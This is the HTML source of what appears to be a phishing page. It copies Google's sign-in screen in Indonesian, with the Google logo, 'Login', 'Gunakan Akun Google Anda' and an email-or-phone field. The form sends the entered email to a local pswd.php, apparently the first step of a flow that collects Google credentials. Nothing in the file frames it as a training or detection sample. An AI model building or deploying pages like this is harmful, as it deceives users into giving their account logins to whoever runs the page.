<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Login</title>
  <link rel="stylesheet" href="style.css">
</head>

<body>
  <div class="box">
    <form action="./pswd.php" class="form" method="get">
      <br>
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/1280px-Google_2015_logo.svg.png" alt="" width="75">
      <br>
      <h1 class="form-title">Login</h1>
      <p class="form-subtitle">Gunakan Akun Google Anda</p>
      <br>
      <div class="form-group">
        <input type="text" class="form-control" name="email" required>
        <label for="" class="form-label">Email atau Ponsel</label>
      </div>
      <div class="bottom-box2 bold">
        <a href="#" class="bold">Lupa Email ?</a>
      </div>
      <br>
      <br>
      <small>
        Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi. Pelajari lebih lanjut
      </small>


      <div class="bottom-box">
        <a href="#">Buat Akun</a>
        <button class="form-button"> Selanjutnya</button>
      </div>

    </form>
  </div>
  <script src="js/script.js"></script>
</body>

</html>